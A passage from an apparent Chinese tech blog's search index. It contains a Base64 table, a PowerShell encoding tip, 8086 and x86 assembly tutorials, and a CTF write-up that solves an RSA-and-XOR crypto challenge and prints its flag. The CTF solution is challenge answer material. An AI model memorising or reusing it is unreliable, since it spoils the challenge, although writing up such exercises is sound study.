center;">2</td></tr><tr class="even"><td style="text-align: center;">7</td><td style="text-align: center;">000111</td><td style="text-align: center;">H</td><td style="text-align: center;"></td><td style="text-align: center;">23</td><td style="text-align: center;">010111</td><td style="text-align: center;">X</td><td style="text-align: center;"></td><td style="text-align: center;">39</td><td style="text-align: center;">100111</td><td style="text-align: center;">n</td><td style="text-align: center;"></td><td style="text-align: center;">55</td><td style="text-align: center;">110111</td><td style="text-align: center;">3</td></tr><tr class="odd"><td style="text-align: center;">8</td><td style="text-align: center;">001000</td><td style="text-align: center;">I</td><td style="text-align: center;"></td><td style="text-align: center;">24</td><td style="text-align: center;">011000</td><td style="text-align: center;">Y</td><td style="text-align: center;"></td><td style="text-align: center;">40</td><td style="text-align: center;">101000</td><td style="text-align: center;">o</td><td style="text-align: center;"></td><td style="text-align: center;">56</td><td style="text-align: center;">111000</td><td style="text-align: center;">4</td></tr><tr class="even"><td style="text-align: center;">9</td><td style="text-align: center;">001001</td><td style="text-align: center;">J</td><td style="text-align: center;"></td><td style="text-align: center;">25</td><td style="text-align: center;">011001</td><td style="text-align: center;">Z</td><td style="text-align: center;"></td><td style="text-align: center;">41</td><td style="text-align: center;">101001</td><td style="text-align: center;">p</td><td style="text-align: center;"></td><td style="text-align: center;">57</td><td style="text-align: center;">111001</td><td style="text-align: center;">5</td></tr><tr class="odd"><td style="text-align: center;">10</td><td style="text-align: center;">001010</td><td style="text-align: center;">K</td><td style="text-align: center;"></td><td style="text-align: center;">26</td><td style="text-align: center;">011010</td><td style="text-align: center;">a</td><td style="text-align: center;"></td><td style="text-align: center;">42</td><td style="text-align: center;">101010</td><td style="text-align: center;">q</td><td style="text-align: center;"></td><td style="text-align: center;">58</td><td style="text-align: center;">111010</td><td style="text-align: center;">6</td></tr><tr class="even"><td style="text-align: center;">11</td><td style="text-align: center;">001011</td><td style="text-align: center;">L</td><td style="text-align: center;"></td><td style="text-align: center;">27</td><td style="text-align: center;">011011</td><td style="text-align: center;">b</td><td style="text-align: center;"></td><td style="text-align: center;">43</td><td style="text-align: center;">101011</td><td style="text-align: center;">r</td><td style="text-align: center;"></td><td style="text-align: center;">59</td><td style="text-align: center;">111011</td><td style="text-align: center;">7</td></tr><tr class="odd"><td style="text-align: center;">12</td><td style="text-align: center;">001100</td><td style="text-align: center;">M</td><td style="text-align: center;"></td><td style="text-align: center;">28</td><td style="text-align: center;">011100</td><td style="text-align: center;">c</td><td style="text-align: center;"></td><td style="text-align: center;">44</td><td style="text-align: center;">101100</td><td style="text-align: center;">s</td><td style="text-align: center;"></td><td style="text-align: center;">60</td><td style="text-align: center;">111100</td><td style="text-align: center;">8</td></tr><tr class="even"><td style="text-align: center;">13</td><td style="text-align: center;">001101</td><td style="text-align: center;">N</td><td style="text-align: center;"></td><td style="text-align: center;">29</td><td style="text-align: center;">011101</td><td style="text-align: center;">d</td><td style="text-align: center;"></td><td style="text-align: center;">45</td><td style="text-align: center;">101101</td><td style="text-align: center;">t</td><td style="text-align: center;"></td><td style="text-align: center;">61</td><td style="text-align: center;">111101</td><td style="text-align: center;">9</td></tr><tr class="odd"><td style="text-align: center;">14</td><td style="text-align: center;">001110</td><td style="text-align: center;">O</td><td style="text-align: center;"></td><td style="text-align: center;">30</td><td style="text-align: center;">011110</td><td style="text-align: center;">e</td><td style="text-align: center;"></td><td style="text-align: center;">46</td><td style="text-align: center;">101110</td><td style="text-align: center;">u</td><td style="text-align: center;"></td><td style="text-align: center;">62</td><td style="text-align: center;">111110</td><td style="text-align: center;">+</td></tr><tr class="even"><td style="text-align: center;">15</td><td style="text-align: center;">001111</td><td style="text-align: center;">P</td><td style="text-align: center;"></td><td style="text-align: center;">31</td><td style="text-align: center;">011111</td><td style="text-align: center;">f</td><td style="text-align: center;"></td><td style="text-align: center;">47</td><td style="text-align: center;">101111</td><td style="text-align: center;">v</td><td style="text-align: center;"></td><td style="text-align: center;">63</td><td style="text-align: center;">111111</td><td style="text-align: center;">/</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
      <category>编码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base64</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cat查看文件内容乱码</title>
    <link href="/2022/08/29/cat%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B9%B1%E7%A0%81/"/>
    <url>/2022/08/29/cat%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B9%B1%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>当我使用cat查看文件内容时，出现了乱码：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220820104158727.png" alt="image-20220820104158727"><figcaption aria-hidden="true">image-20220820104158727</figcaption></figure><p>我的文件是以UTF8的编码形式保存，因此通过<code>cat &lt;filename&gt; -Encoding UTF8</code>可解决：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220820104552230.png" alt="image-20220820104552230"><figcaption aria-hidden="true">image-20220820104552230</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>命令行</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cat</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="/2022/08/29/2022DASCTF%20Apr%20X%20FATE%20%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/08/29/2022DASCTF%20Apr%20X%20FATE%20%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="解题思路">解题思路</h1><h2 id="crypto">CRYPTO</h2><h3 id="easy_real"><strong>easy_real</strong></h3><p>将n分解为两个质数，得到<br><code>q = 65267138038038699886916162739434586079731613825212388229424706115289974540917</code></p><p>利用脚本将m求出<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = <span class="number">65267138038038699886916162739434586079731613825212388229424706115289974540917</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></tbody></table></figure><p><code>m = 2976168736142380455841784134407431434784057911773423743751382131043957</code></p><p>将其转为16进制<code>6e64696f735f3b396b67453b574b38653b573f67576e3c5c3b6b7c6e75</code></p><p>再转为ASCII码<code>ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu</code></p><p>根据异或的运算规律编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu"</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])^x)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>可知当x=8时，得到flag{W31coM3_C0m3_7o_f4T3ctf}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（五）</title>
    <link href="/2022/08/25/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2022/08/25/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言五包含多个段的程序">汇编语言（五）——包含多个段的程序</h1><h2 id="在代码段中使用数据">在代码段中使用数据</h2><p>计算以下8个数据的和，结果存在ax寄存器中：0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h。</p><p>我们希望通过循环的方式进行累加，而在累加前，要将这些数据存储在一组地址连续的内存单元中。具体做法如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br><span class="line"></span><br><span class="line">start: mov bx, 0</span><br><span class="line">       mov ax, 0</span><br><span class="line"></span><br><span class="line">       mov cx, 8</span><br><span class="line">   s:  add ax, cs:[bx]</span><br><span class="line">       add bx, 2</span><br><span class="line">       loop s</span><br><span class="line"></span><br><span class="line">       mov ax, 4c00h</span><br><span class="line">       int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><p>程序中<code>dw</code>（defineword）的含义是定义字型数据。上述程序中使用<code>dw</code>定义了8个字型数据，所占内存空间大小为16字节。</p><p>程序在运行时，<code>CS</code>中存放的是代码段的段地址，由于用<code>dw</code>定义的数据处于代码段的在开始，因此偏移地址为0，则这8个数据所在地址为<code>CS:0</code>、<code>CS:2</code>、<code>CS:4</code>、<code>CS:6</code>、<code>CS:8</code>、<code>CS:A</code>、<code>CS:C</code>、<code>CS:E</code>。</p><p><code>end</code>除了通知编译器程序结束外，还可以通知编译器程序的入口在什么位置。上述示例中，<code>end</code>后面的标号<strong>start</strong> 指明了程序的入口。</p><h2 id="在代码段中使用栈">在代码段中使用栈</h2><p>利用栈，将给定的数据逆序存放：0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h。</p><p>代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">code segment</span><br><span class="line">dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br><span class="line">dw 0, 0, 0, 0, 0, 0, 0, 0    用dw定义16个字型数据，在程序加载后，取得16个字的内存空间，    存放这16个数据。在后面的程序中将这段空间当作栈来使用。</span><br><span class="line">start: mov ax, cs</span><br><span class="line">       mov ss, ax</span><br><span class="line">       mov sp, 30h           将设置栈顶ss:sp指向cs:30</span><br><span class="line">       </span><br><span class="line">       mov bx, 0</span><br><span class="line">       mov cx, 8</span><br><span class="line">    s: push cs:[bx]</span><br><span class="line">       add bx, 2</span><br><span class="line">       loop s                以上将代码段0~15单元中的8个字型数据依次入栈</span><br><span class="line">       </span><br><span class="line">       mov bx, 0</span><br><span class="line">       mov cx, 8</span><br><span class="line">   s0: pop cs:[bx]</span><br><span class="line">       add bx, 2</span><br><span class="line">       loop s0               以上依次出栈8个字型数据到代码段0~15单元中</span><br><span class="line">       </span><br><span class="line">       mov ax, 4c00h</span><br><span class="line">       int 21h</span><br><span class="line">       </span><br><span class="line">codesg ends</span><br><span class="line">end start                        指明程序的入口在start处</span><br></pre></td></tr></tbody></table></figure><p>由上述代码可知<code>cs:10 ~ cs:2F</code>内存空间用来当作栈使用，初始状态下栈为空，所以<code>ss:sp</code>要指向栈底，则设置<code>ss:sp</code>指向<code>cs:30</code>（入栈sp=sp-2）。</p><h2 id="将数据代码栈放入不同的段">将数据、代码、栈放入不同的段</h2><p>当数据、代码和栈需要的空间超过64KB，就不能放在一个段中(一个段的容量不能大于64KB，这是8086模式的限制，并不是所有处理器都这样)。</p><p>示例代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data, ss:stack</span><br><span class="line"></span><br><span class="line">data segment                数据段</span><br><span class="line">dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment               栈段</span><br><span class="line">dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment                代码段</span><br><span class="line">start:  mov ax, stack </span><br><span class="line">        mov ss, ax</span><br><span class="line">        mov sp 20h          设置栈顶ss:sp指向stack:20</span><br><span class="line">        </span><br><span class="line">        mov ax, data</span><br><span class="line">        mov ds, ax          ds指向data段</span><br><span class="line">        </span><br><span class="line">        mov bx, 0           ds:bx指向data段中的第一个单元</span><br><span class="line">        </span><br><span class="line">        mov cx, 8</span><br><span class="line">s:      push [bx]</span><br><span class="line">        add bx, 2</span><br><span class="line">        loop s              以上将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line">        </span><br><span class="line">        mov bx, 0</span><br><span class="line">        </span><br><span class="line">        mov cx, 8</span><br><span class="line">s0:     pop [bx]</span><br><span class="line">        add bx, 2</span><br><span class="line">        loop s0</span><br><span class="line">        </span><br><span class="line">        mov ax, 4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure><p><code>mov ax,data</code>的含义就是将名称<code>data</code>段的段地址送入<code>ax</code>。<code>data</code>段中的数据<code>0abch</code>的地址就是<code>data:6</code>。不能直接将数值直接送入段寄存器中，因此<code>mov ds,data</code>是错误的。正确的语句如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, data</span><br><span class="line">mov ds, ax      利用ax寄存器作为中转</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（四）</title>
    <link href="/2022/08/24/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2022/08/24/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言四bx和loop指令">汇编语言（四）——[BX]和loop指令</h1><h2 id="bx">[bx]</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [bx]</span><br></pre></td></tr></tbody></table></figure><p>上述指令的功能：bx中存放的数据作为一个偏移地址 EA ，段地址 SA 默认在ds 中，将 SA:EA 处的数据送入 ax 中，即：(ax)=((ds)*16+(bx))。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [bx], ax</span><br></pre></td></tr></tbody></table></figure><p>该指令的功能则是：将 ax 中的数据送入内存 SA:EA处，即：((ds)*16+(bx))=(ax)。</p><p>我们可以不写新的指令，<strong>仅通过改变 bx中的数值，改变指令访问的内存单元</strong>。</p><h2 id="loop指令">Loop指令</h2><p>CPU执行loop指令时要进行两步操作：</p><ul><li>(cx)=(cx)-1。</li><li>判断 cx 中的值，不为0则转至标号处执行程序，如果为0则向下执行。</li></ul><p>由上述可知 cx 中存放着循环次数。</p><p>下面是一个关于loop的示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">计算2^12</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax, 2</span><br><span class="line">mov cx, 11</span><br><span class="line">S:  add ax, ax</span><br><span class="line">loop s</span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><h2 id="段前缀">段前缀</h2><p>可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器。这些用于访问内存单元的指令中，用于显式地指明内存单元的段地址的<code>ds:</code>（数据段寄存器）、<code>cs:</code>（代码段寄存器）、<code>ss:</code>（堆栈段寄存器）、<code>es:</code>（附加段寄存器），在汇编语言中称为段前缀。</p><h2 id="一段安全的空间">一段安全的空间</h2><p>一般的PC机中，DOS方式下，DOS和其他合法的程序一般不会使用0:200 ~0:2ff（00200h ~002ffh）的256个字节的空间。因此当我们需要直接向一段内存中写入内容时，就使用0:200~ 0:2ff这段空间。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86指令（Instructions）</title>
    <link href="/2022/08/21/x86%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/08/21/x86%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>以AT&amp;T语法为例，AT&amp;T与Intel的区别见：<br>https://hxt616.github.io/2022/08/16/AT&amp;T%E5%92%8CIntel/</p><p>本文参考《CTF All InOne》：https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1.5.2_assembly.html#334-%E6%8C%87%E4%BB%A4-instructions</p><h1 id="三类x86指令">三类x86指令</h1><h2 id="数据移动指令">数据移动指令</h2><h3 id="mov-移动"><code>mov</code> 移动</h3><p><code>mov</code> 指令将数据从它的第一个参数 ( 即寄存器中的内容,内存单元中的内容, 或者一个常数值 ) 复制到它的第二个参数 (即寄存器或者内存单元 ). 当寄存器到寄存器之间的数据移动是可行的时候,直接地从内存单元中将数据移动到另一内存单元中是不行的.在这种需要在内存单元中传递数据的情况下,它数据来源的那个内存单元必须首先把那个内存单元中的数据加载到一个寄存器中,然后才可以通过这个寄存器来把数据移动到目标内存单元中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %ebx, %eax        将 EBX 中的值复制到 EAX 中</span><br><span class="line">mov %ebx, var(,1)     将 EBX 中的 4 个字节大小的数据移动的内存中标签为 var 的地方去.( var 是一个 32 位常数)</span><br><span class="line">mov (%ebx), %eax      从 EBX 中的内存地址加载 4 个字节的数据到 EAX, 就是把 EBX 中的内容当作标签, 这个标签在内存中对应的数据放到 EAX 中</span><br></pre></td></tr></tbody></table></figure><h3 id="push-入栈"><code>push</code> 入栈</h3><p><code>push</code>指令将它的参数移动到硬件支持的<strong>栈</strong>内存顶端.特别地, <code>push</code> 首先将 ESP 中的值<strong>减少</strong> 4,然后将它的参数移动到一个 32 位的地址单元 ( %esp ). ESP ( 栈指针 )会随着不断入栈从而持续递减, 即栈内存是从高地址单元到低地址单元增长。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push %eax         将 EAX 送入栈</span><br><span class="line">push var(,1)      将 var 对应的 4 字节大小的数据送入栈中</span><br></pre></td></tr></tbody></table></figure><h3 id="pop-出栈"><code>pop</code> 出栈</h3><p><code>pop</code>指令从硬件支持的栈内存顶端移除 4 字节的数据,并把这个数据放到该指令指定的参数中 ( 即寄存器或者内存单元 ).其首先将内存中 ( %esp ) 的 4 字节数据放到指定的寄存器或者内存单元中,然后让 <strong>ESP + 4</strong>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop %edi       将栈顶的元素移除, 并放入到寄存器 EDI 中</span><br><span class="line">pop (%ebx)     将栈顶的元素移除, 并放入从 EBX 开始的 4 个字节大小的内存单元中</span><br></pre></td></tr></tbody></table></figure><h3 id="lea-加载有效地址"><code>lea</code> 加载有效地址</h3><p><code>lea</code>指令将其第一个参数指定的内存单元 放入到第二个参数指定的寄存器中。</p><p><code>LEA AX,[1000H]</code>，作用是将源操作数 [1000H] 的偏移地址1000H 送至 AX。理解时，可直接将[ ]去掉，等同于<code>MOV AX,1000H</code>。 再如：<code>LEA BX,[AX]</code>，等同于<code>MOV BX,AX</code>；<code>LEA BX,TABLE</code> 等同于<code>MOV BX,OFFSET TABLE</code>。 但有时不能直接使用 <code>MOV</code>代替： 比如：<code>LEA AX,[SI+6]</code>不能直接替换成：<code>MOV AX,SI+6</code>；但可替换为：<code>MOV AX,SI</code> <code>ADD AX,6</code> 两步完成。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea (%ebx,%esi,8), %edi      EBX+8*ESI 的值被移入到了 EDI</span><br><span class="line">lea val(,1), %eax          val 的值被移入到了 EAX</span><br></pre></td></tr></tbody></table></figure><h2 id="逻辑运算指令">逻辑运算指令</h2><h3 id="add-整数相加"><code>add</code> 整数相加</h3><p><code>add</code>指令将两个参数相加，然后将结果存放到第二个参数中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add $10, %eax        EAX 中的值被设置为了 EAX+10</span><br><span class="line">addb $10, (%eax)       往 EAX 中的值 所代表的内存单元地址 加上 1 个字节的数字 10</span><br></pre></td></tr></tbody></table></figure><h3 id="sub-整数相减"><code>sub</code> 整数相减</h3><p><code>sub</code>指令将第二个参数的值与第一个相减，就是后面那个减去前面那个，然后把结果存储到第二个参数。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub %ah, %al      AL 被设置成 AL-AH</span><br><span class="line">sub $216, %eax        将 EAX 中的值减去 216</span><br></pre></td></tr></tbody></table></figure><h3 id="inc-自增"><code>inc</code> 自增</h3><p><code>inc</code> 指令让它的参数加 1。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incl var(,1)        将 var 所代表的 32 位整数加上 1</span><br></pre></td></tr></tbody></table></figure><h3 id="dec-自减"><code>dec</code> 自减</h3><p><code>dec</code>指令让它的参数减1。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dec %eax       EAX 中的值减去 1</span><br></pre></td></tr></tbody></table></figure><h3 id="imul-整数相乘"><code>imul</code> 整数相乘</h3><p><code>imul</code> 指令有两种基本格式 : 第一种是 2个参数的；第二种格式是 3 个参数的。</p><p>2 个参数的这种格式, 先是将两个参数相乘,然后把结果存到第二个参数中。<strong>运算结果 ( 即第二个参数 )必须是一个寄存器</strong>。</p><p>3 个参数的这种格式，先是将它的第 1 个参数和第 2个参数相乘，然后把结果存到第 3 个参数中，<strong>第 3个参数必须是一个寄存器</strong>。此外，第 1 个参数必须是一个常数。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">imul (%ebx), %eax        将 EAX 中的 32 位整数, 与 EBX 中的内容所指的内存单元, 相乘, 然后把结果存到 EAX 中</span><br><span class="line">imul $25, %edi, %esi        ESI 被设置为 EDI * 25.</span><br></pre></td></tr></tbody></table></figure><h3 id="idiv-整数相除"><code>idiv</code> 整数相除</h3><p><code>idiv</code>只有一个操作数，此操作数为除数，而被除数则为 EDX :EAX 中的内容（一个64位的整数），除法结果 ( 商 ) 存在 EAX中，而所得的余数存在 EDX 中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idiv %ebx       用 EDX : EAX 的值除以 EBX 的值。商存放在 EAX 中, 余数存放在 EDX 中</span><br><span class="line">idivw (%ebx)       将 EDX : EAX 的值除以存储在 EBX 所对应内存单元的 32 位值。商存放在 EAX 中, 余数存放在 EDX 中</span><br></pre></td></tr></tbody></table></figure><h3 id="andorxor-按位逻辑-与-或-异或-运算"><code>and</code>，<code>or</code>，<code>xor</code>按位逻辑 与, 或, 异或 运算</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and $0x0F, %eax       只留下 EAX 中最后 4 位数字 (二进制位)</span><br><span class="line">xor %edx, %edx       将 EDX 的值全部设置成 0</span><br></pre></td></tr></tbody></table></figure><h3 id="not-非"><code>not</code> 非</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">not %eax     将 EAX 的所有值翻转</span><br></pre></td></tr></tbody></table></figure><h3 id="neg-取负指令"><code>neg</code> 取负指令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neg %eax       EAX → -EAX</span><br></pre></td></tr></tbody></table></figure><h3 id="shl-按位左移"><code>shl</code> 按位左移</h3><p><code>shl</code>对第二个参数进行位运算，移动的位数由第一个参数决定。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shl $1, %eax       将 EAX 的值乘以 2 (如果最高有效位是 0 的话)</span><br></pre></td></tr></tbody></table></figure><h3 id="shr-按位右移"><code>shr</code> 按位右移</h3><p>同上</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shr %cl, %ebx       将 EBX 的值除以 2n, 其中 n 为 CL 中的值, 运算最终结果存到 EBX 中</span><br></pre></td></tr></tbody></table></figure><h2 id="流程控制指令">流程控制指令</h2><p>x86处理器的指令指针寄存器 ( EIP )为 32位寄存器，它用来在内存中指示我们输入汇编指令的位置。就是说这个寄存器指向哪个内存单元，那个单元存储的机器码就是程序执行的指令。通常它是指向我们程序要执行的下一条指令。</p><h3 id="jmp-跳转指令"><code>jmp</code> 跳转指令</h3><p>将程序跳转到参数指定的内存地址，然后执行该内存地址的指令。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp begin         跳转到打了 " begin " 这个标签的地方</span><br></pre></td></tr></tbody></table></figure><h3 id="jcondition-有条件的跳转"><code>jcondition</code>有条件的跳转</h3><p>语法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">je &lt;label           当相等的时候跳转</span><br><span class="line">jne &lt;label          当不相等的时候跳转</span><br><span class="line">jz &lt;label           当最后结果为 0 的时候跳转</span><br><span class="line">jg &lt;label           当大于的时候跳转</span><br><span class="line">jge &lt;label          当大于等于的时候跳转</span><br><span class="line">jl &lt;label           当小于的时候跳转</span><br><span class="line">jle 